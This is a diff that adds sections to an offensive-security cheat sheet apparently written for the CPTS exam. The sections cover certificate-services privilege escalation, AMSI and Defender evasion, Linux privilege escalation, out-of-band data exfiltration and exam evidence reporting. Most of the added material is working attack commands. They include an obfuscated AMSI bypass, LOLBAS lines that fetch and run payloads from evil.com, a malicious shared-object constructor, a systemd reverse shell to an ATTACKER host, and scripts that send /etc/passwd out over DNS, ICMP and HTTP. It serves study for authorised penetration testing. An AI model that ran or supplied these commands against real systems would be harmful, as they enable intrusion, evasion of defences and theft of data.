@@ -10,7 +10,7 @@
 # MASTER DECISION FLOW — Read This First
 # ═══════════════════════════════════════════════════════════
 
-```
+```python
 START: You have a target IP or domain
  │
  ├─▶ PHASE 1: PREPARATION (Section 1)
@@ -345,13 +345,13 @@ curl -s "https://crt.sh/?q=facebook.com&output=json" | jq -r '.[] | select(.name
 
 **HOW — choose tool based on situation:**
 
-| Tool | WHEN to Use | Command |
-|------|------------|---------|
-| **dnsenum** | Comprehensive brute-force | `dnsenum --enum inlanefreight.com -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -r` |
-| **ffuf** | HTTP-based vHost discovery | `ffuf -u http://IP:PORT -w subdomains.txt -mc 200,403 -H "Host: FUZZ.domain.htb" -ac` |
-| **gobuster vhost** | Fast vHost discovery | `gobuster vhost -u http://IP -w subdomains.txt --domain domain.htb --append-domain -t 50` |
-| **amass** | Extensive data source integration | `amass enum -d inlanefreight.com` |
-| **assetfinder** | Quick, lightweight | `assetfinder --subs-only inlanefreight.com` |
+| Tool               | WHEN to Use                       | Command                                                                                                     |
+| ------------------ | --------------------------------- | ----------------------------------------------------------------------------------------------------------- |
+| **dnsenum**        | Comprehensive brute-force         | `dnsenum --enum inlanefreight.com -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -r` |
+| **ffuf**           | HTTP-based vHost discovery        | `ffuf -u http://IP:PORT -w subdomains.txt -mc 200,403 -H "Host: FUZZ.domain.htb" -ac`                       |
+| **gobuster vhost** | Fast vHost discovery              | `gobuster vhost -u http://IP -w subdomains.txt --domain domain.htb --append-domain -t 50`                   |
+| **amass**          | Extensive data source integration | `amass enum -d inlanefreight.com`                                                                           |
+| **assetfinder**    | Quick, lightweight                | `assetfinder --subs-only inlanefreight.com`                                                                 |
 
 **DNS Zone Transfer (if misconfigured — rare but critical):**
 ```bash
@@ -3054,6 +3054,273 @@ Credential Hunting:
 Historical Recon:
 └─ Wayback Machine (web.archive.org) → Old pages, leaked configs
 ```
+
+
+# ═══════════════════════════════════════════════════════════
+# SUPP-13: AD CS (Active Directory Certificate Services) — ESC1 through ESC8
+# ═══════════════════════════════════════════════════════════
+
+```
+FOUND Certificate Authority (CA) in environment?
+├─ Port 135/445 + Certificate Services role detected?
+│  ├─ CHECK: Web Enrollment on port 80/443? → certipy find / certify.exe
+│  ├─ CHECK: ADCS Web Enrollment accessible? → http://CA_SERVER/certsrv/
+│  └─ CHECK: Misconfigured templates? → certipy find -u user@dom -p pass -dc-ip DC -vulnerable
+│
+├─ AD CS ESC1-ESC8 Decision Flow:
+│  ├─ ESC1 (Misconfigured Certificate Template):
+│  │  ├─ Template allows ENROLLEE_SUPPLIES_SUBJECT + has Client Authentication EKU
+│  │  ├─ certipy req -ca 'CA_NAME' -template 'VULN_TEMPLATE' -upn Administrator@domain -dc-ip DC
+│  │  └─ Result: Get certificate as ANY user → authenticate as DA
+│  ├─ ESC2 (Misconfigured Certificate Template - Any Purpose):
+│  │  ├─ Template has "Any Purpose" EKU (1.3.6.1.4.1.311.21.8.1 or 2.5.29.37.0)
+│  │  └─ Can request certificate for ANY purpose → same as ESC1 but broader
+│  ├─ ESC3 (Enrollment Agent Template):
+│  │  ├─ Template has Certificate Request Agent EKU
+│  │  └─ Use to request certificate ON BEHALF OF another user
+│  ├─ ESC4 (Vulnerable Certificate Template Access Control):
+│  │  ├─ User has Write/Owner permissions on template
+│  │  ├─ certipy template -user user@dom -pass pass -dc-ip DC -template 'VULN_TEMPLATE' -save-old
+│  │  └─ Modify template to enable ENROLLEE_SUPPLIES_SUBJECT → exploit as ESC1
+│  ├─ ESC5 (Vulnerable PKI Object ACLs):
+│  │  └─ Generic misconfiguration in AD CS objects → audit with certipy find -vulnerable
+│  ├─ ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2):
+│  │  ├─ CA flag allows subject alternative names in ANY request
+│  │  ├─ certipy find -u user@dom -p pass -dc-ip DC
+│  │  └─ Request cert with -upn Administrator@domain → get DA cert
+│  ├─ ESC7 (Vulnerable Certificate Authority Access Control):
+│  │  ├─ User has Manage CA or Manage Certificates permissions
+│  │  ├─ certipy ca -u user@dom -p pass -dc-ip DC -ca 'CA_NAME' -add-officer 'user'
+│  │  └─ Enable ESC6 flag → request certificate as DA
+│  └─ ESC8 (NTLM Relay to AD CS HTTP Endpoints):
+│     ├─ ADCS Web Enrollment enabled? → impacket-ntlmrelayx -t http://CA/certsrv/ -smb2support --adcs
+│     ├─ Coerce auth via PetitPotam/PrinterBug/xp_dirtree
+│     └─ Result: Relay → get certificate → authenticate as relayed user
+│
+├─ Tool Choice:
+│  ├─ Linux (preferred) → certipy (find, req, auth, ca, template)
+│  └─ Windows → Certify.exe (find, request, download, convert)
+│
+└─ After getting certificate:
+   ├─ certipy auth -pfx user.pfx -dc-ip DC_IP -domain DOMAIN
+   ├─ Convert .pfx to .kirbi for Rubeus: certipy pfx -in user.pfx -nocert -out user.kirbi
+   └─ Rubeus.exe asktgt /user:admin /certificate:user.kirbi /ptt
+```
+
+---
+
+# ═══════════════════════════════════════════════════════════
+# SUPP-14: Modern Evasion & AMSI — Strategy for Failure
+# ═══════════════════════════════════════════════════════════
+
+```
+Defender RealTimeProtection ON? AMSI blocking PowerShell?
+│
+├─ STEP 1: Check what you're up against
+│  ├─ Get-MpComputerStatus | Select RealTimeProtectionEnabled, AntivirusEnabled
+│  ├─ [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').GetValue($null)
+│  └─ whoami /priv → check for SeDebugPrivilege, SeImpersonatePrivilege
+│
+├─ STEP 2: Living Off the Land (LOLBAS) Execution Branch
+│  ├─ mshta.exe → Execute HTA files with embedded JavaScript/VBScript
+│  │  └─ mshta.exe javascript:a=GetObject("script:https://evil.com/payload.sct").Exec();
+│  ├─ rundll32.exe → Load and execute DLL exports
+│  │  └─ rundll32.exe \evil.com\share\payload.dll,EntryPoint
+│  ├─ InstallUtil.exe → .NET assembly execution (bypasses AppLocker)
+│  │  └─ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe
+│  ├─ regsvr32.exe → Execute COM scriptlets (SCT files)
+│  │  └─ regsvr32.exe /s /n /u /i:https://evil.com/payload.sct scrobj.dll
+│  ├─ certutil.exe → Download + decode payloads
+│  │  └─ certutil -urlcache -split -f https://evil.com/payload.b64 && certutil -decode payload.b64 payload.exe
+│  ├─ forfiles.exe → Execute commands via file iteration
+│  │  └─ forfiles /p C:\Windows\System32 /m cmd.exe /c "payload"
+│  └─ cmstp.exe → Execute INF files with embedded commands
+│     └─ cmstp.exe /ni /s payload.inf
+│
+├─ STEP 3: PowerShell Constrained Language Mode (CLM) Bypass
+│  ├─ Check if in CLM: $ExecutionContext.SessionState.LanguageMode
+│  ├─ If CLM: Use full .NET via InstallUtil (above)
+│  ├─ Alternative: Use csc.exe to compile C# payloads in memory
+│  └─ Alternative: Use Python/Ruby if installed (avoids PowerShell entirely)
+│
+├─ STEP 4: AMSI Bypass Techniques
+│  ├─ [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+│  ├─ S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1q2'+'u3x') ) = ( [TyPe]("{1}{0}"-F'F','rE') ) ; ( Get-Varia`ble ('1q2'+'u3x') -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('ams'+'i'),'d','I'+'nitF'+'aile' ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ) )."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
+│  ├─ Use compiled C# binary instead of PowerShell (compiled = no AMSI scan)
+│  └─ Use unmanaged code (Meterpreter, Cobalt Strike) that never loads PowerShell
+│
+└─ STEP 5: If all else fails → Linux tools via WSL
+   ├─ Check: wsl --list
+   └─ WSL traffic NOT parsed by Windows Firewall or Defender
+```
+
+---
+
+# ═══════════════════════════════════════════════════════════
+# SUPP-15: Deep Linux Internals — Advanced PrivEsc
+# ═══════════════════════════════════════════════════════════
+
+```
+Standard Linux PrivEsc (sudo/SUID/cron) failed? Go DEEPER:
+│
+├─ Shared Object (.so) Hijacking
+│  ├─ Check custom binaries: find / -type f -perm -o+x -newer /etc/passwd 2>/dev/null
+│  ├─ Check for missing .so files: ldd /path/to/binary | grep "not found"
+│  ├─ Check for writable .so directories: for lib in $(ldd /path/to/binary | awk '{print $3}'); do test -w "$lib" && echo "$lib is WRITABLE"; done
+│  ├─ If .so is writable or in writable directory → replace with malicious .so
+│  └─ Compile malicious .so:
+│     └─ gcc -shared -o libevil.so -fPIC -Wl,-soname,libevil.so evil.c
+│        // evil.c: __attribute__((constructor)) void init() { setuid(0); system("/bin/bash"); }
+│
+├─ Python Library Hijacking
+│  ├─ Check Python paths: python3 -c "import sys; print('\n'.join(sys.path))"
+│  ├─ Look for writable directories in sys.path
+│  ├─ Check if script imports modules without full path: grep -r "^import\|^from" /opt/scripts/ 2>/dev/null
+│  ├─ If script does: import module → Create /writable/path/module.py with reverse shell
+│  └─ Check PYTHONPATH env var: echo $PYTHONPATH → if set, directories may be writable
+│
+├─ Capabilities Abuse (getcap -r /) — OFTEN THE INTENDED PATH
+│  ├─ Full scan: getcap -r / 2>/dev/null
+│  ├─ Common dangerous capabilities:
+│  │  ├─ cap_setuid+ep → python -c 'import os; os.setuid(0); os.system("/bin/bash")'
+│  │  ├─ cap_dac_read_search+ep → read ANY file (including /etc/shadow)
+│  │  ├─ cap_net_raw+ep → packet capture, ARP spoofing
+│  │  ├─ cap_sys_admin+ep → mount filesystems, Docker escape
+│  │  ├─ cap_fowner+ep → change file ownership, bypass permissions
+│  │  ├─ cap_chown+ep → change file ownership
+│  │  ├─ cap_setfcap+ep → set file capabilities (escalate to other caps)
+│  │  ├─ cap_sys_ptrace+ep → ptrace processes, inject code
+│  │  └─ cap_dac_override+ep → bypass file permission checks
+│  └─ GTFOBins: https://gtfobins.github.io/#+capabilities
+│
+├─ Writable Systemd Services
+│  ├─ Check for writable service files: find /etc/systemd /lib/systemd /usr/lib/systemd -writable -name "*.service" 2>/dev/null
+│  ├─ If writable → add ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'
+│  └─ Trigger: systemctl daemon-reload && systemctl start service
+│
+├─ Docker/Container Escape
+│  ├─ Check if in container: cat /proc/1/cgroup | grep docker
+│  ├─ Check for Docker socket: ls -la /var/run/docker.sock
+│  ├─ If socket accessible → docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash
+│  └─ Check for privileged container: cat /proc/self/status | grep Cap → cap_sys_admin
+│
+├─ NFS Root Squashing (re-check)
+│  ├─ showmount -e TARGET → if export with no_root_squash
+│  └─ Mount, create SUID binary, execute on target
+│
+├─ Kernel Exploits (LAST RESORT — unstable)
+│  ├─ Check kernel version: uname -r
+│  ├─ Check for known exploits: searchsploit linux kernel <version>
+│  └─ Common: Dirty COW (CVE-2016-5195), Dirty Pipe (CVE-2022-0847), overlayfs (CVE-2021-3493)
+│
+└─ Automated Deep Enum:
+   ├─ linpeas.sh -a → covers ALL of the above
+   └─ lse.sh -l 2 → Linux Smart Enumeration, level 2 (more thorough)
+```
+
+---
+
+# ═══════════════════════════════════════════════════════════
+# SUPP-16: OOB (Out-of-Band) Data Exfiltration — Blind Command Injection
+# ═══════════════════════════════════════════════════════════
+
+```
+Blind command injection? Can't get reverse shell? (Hardened DMZs, WAFs)
+│
+├─ DECISION: What protocol can reach you?
+│  ├─ DNS allowed outbound? → DNS exfiltration (most reliable)
+│  ├─ ICMP allowed outbound? → ICMP exfiltration
+│  ├─ HTTP/HTTPS allowed outbound? → HTTP exfiltration
+│  └─ Nothing allowed? → Timing-based blind injection (slow but possible)
+│
+├─ DNS Exfiltration (via dnstool or manual encoding)
+│  ├─ Setup listener: while true; do nc -lvnp 53; done  # OR use dnscat2 server
+│  ├─ Encode + send data:
+│  │  ├─ hex=$(cat /etc/passwd | xxd -p | tr -d '\n')
+│  │  ├─ chunk_size=50
+│  │  ├─ for ((i=0; i<${#hex}; i+=chunk_size)); do chunk=${hex:i:chunk_size}; dig "$chunk.evil.com"; done
+│  │  └─ Decode received chunks on attacker side
+│  ├─ Automated: dnscat2 --dns server=ATTACKER,port=53 --secret=SECRET
+│  └─ Alternative: iodine for full TCP tunnel over DNS
+│
+├─ ICMP Exfiltration
+│  ├─ Encode data in ICMP payload:
+│  │  ├─ data=$(cat /etc/passwd | base64 | tr -d '\n')
+│  │  ├─ for ((i=0; i<${#data}; i+=20)); do ping -p "${data:i:20}" ATTACKER_IP; done
+│  │  └─ Capture with: tcpdump -i tun0 -w capture.pcap → extract payloads in Wireshark
+│  └─ Alternative: ptunnel-ng for full TCP tunnel over ICMP
+│
+├─ HTTP/HTTPS Exfiltration
+│  ├─ POST data to attacker:
+│  │  ├─ curl -X POST http://ATTACKER/collect -d "$(cat /etc/passwd | base64)"
+│  │  ├─ wget --post-data="$(cat /etc/passwd | base64)" http://ATTACKER/collect
+│  │  └─ powershell: Invoke-RestMethod -Uri http://ATTACKER/collect -Method POST -Body $(Get-Content file | base64)
+│  └─ Attacker: python3 -m http.server 80 → logs all requests with data
+│
+├─ Timing-Based Blind Extraction (when NOTHING reaches you)
+│  ├─ Boolean-based: IF condition_true THEN sleep 5
+│  │  ├─ Test: if [ $(whoami) = "root" ]; then sleep 5; fi
+│  │  └─ Measure response time to determine true/false
+│  ├─ Character-by-character extraction:
+│  │  └─ for c in {a..z}; do if [ "$(whoami | cut -c1)" = "$c" ]; then sleep 5; fi; done
+│  └─ Automated: sqlmap --technique=T (time-based) for SQLi
+│
+└─ Proof of Concept for Blind Injection (no shell needed)
+   ├─ Ping-based: Inject command that pings YOUR IP → proves execution
+   ├─ DNS-based: Inject nslookup YOUR_IP → proves execution
+   ├─ HTTP-based: Inject curl http://YOUR_IP → proves execution
+   └─ Time-based: Inject sleep 10 → proves execution via response delay
+```
+
+---
+
+# ═══════════════════════════════════════════════════════════
+# SUPP-17: CPTS Evidence Checklist — Reporting Proof of Concept
+# ═══════════════════════════════════════════════════════════
+
+```
+FOR EVERY compromised host (exam requirement — incomplete proof = FAIL):
+│
+├─ REQUIRED Evidence:
+│  ├─ 1. whoami && hostname && ipconfig /all (or ifconfig on Linux)
+│  │   └─ Screenshot MUST show: username, hostname, IP configuration
+│  ├─ 2. flag.txt content AND its full file path
+│  │   ├─ cat /path/to/flag.txt && echo "---" && pwd
+│  │   └─ Screenshot MUST show both: flag content AND path
+│  ├─ 3. Screenshot of the EXACT exploit command used
+│  │   └─ Terminal showing: command typed → command executed → result
+│  ├─ 4. Privilege level achieved (user → root/SYSTEM/DA)
+│  │   └─ Linux: id && whoami
+│  │   └─ Windows: whoami && whoami /priv && whoami /groups
+│  └─ 5. Network position (which subnet, which NIC)
+│     └─ ip addr / ipconfig showing all interfaces
+│
+├─ RECOMMENDED Evidence:
+│  ├─ Full attack chain documentation (initial access → privilege escalation → lateral movement)
+│  ├─ Timestamps for each step
+│  ├─ Tool output logs (not just screenshots)
+│  ├─ Before/after system state (for destructive actions)
+│  └─ Cleanup confirmation (removed shells, tools, added users)
+│
+├─ Report Structure (per host):
+│  ├─ Executive Summary: What was compromised, business impact
+│  ├─ Technical Details: Step-by-step reproduction
+│  │   ├─ Prerequisites (what you had before)
+│  │   ├─ Exploitation (exact commands, tool versions)
+│  │   ├─ Result (what you gained)
+│  │   └─ Proof (screenshots, flags, paths)
+│  ├─ Remediation: How to fix the vulnerability
+│  └─ Risk Rating: CVSS score + business context
+│
+└─ Exam-Specific Tips:
+   ├─ Take screenshots EARLY — shells can die during exam
+   ├─ Save ALL terminal output to log files (script, tee, tmux logging)
+   ├─ Document the FULL attack path, not just the final step
+   ├─ Show HOW you found the vulnerability, not just that it exists
+   └─ Business impact > technical details in executive summary
+```
+
+---
 
 
 ---
